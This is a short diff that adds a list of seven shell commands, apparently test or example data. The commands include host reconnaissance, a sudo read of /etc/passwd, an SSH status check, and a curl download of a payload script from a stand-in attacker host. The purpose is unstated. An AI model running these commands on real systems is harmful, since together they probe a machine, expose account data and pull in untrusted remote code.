@@ -1,0 +1,7 @@
+whoami
+id
+uname -a
+sudo cat /etc/passwd
+sudo systemctl status ssh
+curl http://malicious.example.test/payload.sh
+sha256sum /tmp/payload.sh
